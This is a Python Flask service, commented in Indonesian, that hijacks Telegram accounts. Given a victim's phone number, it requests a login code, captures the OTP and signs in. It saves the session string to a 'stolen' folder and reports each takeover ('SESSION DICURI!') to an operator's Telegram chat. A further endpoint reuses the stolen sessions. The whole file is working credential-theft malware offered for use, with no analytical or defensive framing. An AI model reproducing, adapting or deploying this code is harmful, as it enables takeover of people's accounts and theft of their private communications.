from flask import Flask, request, jsonify
from telethon import TelegramClient, events
from telethon.sessions import StringSession
import asyncio
import os
import re

app = Flask(__name__)

# AMBIL DARI RAILWAY VARIABLES (WAJIB!)
API_ID = int(os.getenv('API_ID'))
API_HASH = os.getenv('API_HASH')
PHONE = os.getenv('PHONE')
BOT_TOKEN = os.getenv('BOT_TOKEN')  # NO input()!
CHAT_ID = int(os.getenv('CHAT_ID'))  # NO input()!

# Cek kalau kosong
if not all([API_ID, API_HASH, PHONE, BOT_TOKEN, CHAT_ID]):
    print("ERROR: Set semua variable di Railway dulu, brengsek!")
    exit(1)

client = TelegramClient('jinx_listener', API_ID, API_HASH)
loop = asyncio.get_event_loop()

listening = {}
sessions = {}
OTP_PATTERN = re.compile(r'\b(\d{5})\b')

@app.route('/start_listen', methods=['POST'])
def start_listen():
    data = request.get_json()
    phone = data['phone']

    async def run():
        temp_client = TelegramClient(StringSession(), API_ID, API_HASH)
        await temp_client.connect()
        try:
            sent = await temp_client.send_code_request(phone)
            listening[phone] = {'client': temp_client, 'hash': sent.phone_code_hash}

            @temp_client.on(events.NewMessage(incoming=True))
            async def handler(event):
                if OTP_PATTERN.search(event.message.message):
                    code = OTP_PATTERN.search(event.message.message).group(1)
                    await auto_login(phone, code)

            await client.start(bot_token=BOT_TOKEN)  # Gunakan BOT_TOKEN
            await client.send_message(CHAT_ID, f"TARGET: `{phone}`\nMenunggu OTP...")
            return {'success': True}
        except Exception as e:
            return {'success': False, 'error': str(e)}

    return jsonify(loop.run_until_complete(run()))

async def auto_login(phone, code):
    if phone not in listening: return
    data = listening[phone]
    client_temp = data['client']
    hash_ = data['hash']

    try:
        await client_temp.sign_in(phone, code, phone_code_hash=hash_)
        me = await client_temp.get_me()
        auth = client_temp.session.save()

        os.makedirs("stolen", exist_ok=True)
        with open(f"stolen/{phone.replace('+','')}.session", "w") as f:
            f.write(auth)

        sessions[phone] = auth
        msg = f"SESSION DICURI!\nUser: {me.first_name}\nPhone: `{phone}`\n/login {phone}"
        await client.send_message(CHAT_ID, msg)
        del listening[phone]
    except Exception as e:
        await client.send_message(CHAT_ID, f"Gagal: {str(e)}")

@app.route('/request_otp/<phone>', methods=['GET'])
def request_otp(phone):
    if phone not in sessions:
        return jsonify({'success': False, 'error': 'No session'})
    
    async def run():
        stolen = TelegramClient(StringSession(sessions[phone]), API_ID, API_HASH)
        await stolen.connect()
        await stolen.start()
        await stolen.send_code_request(phone)
        return {'success': True}
    
    return jsonify(loop.run_until_complete(run()))

if __name__ == '__main__':
    os.makedirs("stolen", exist_ok=True)
    loop.run_until_complete(client.start(bot_token=BOT_TOKEN))
    app.run(host='0.0.0.0', port=8080)
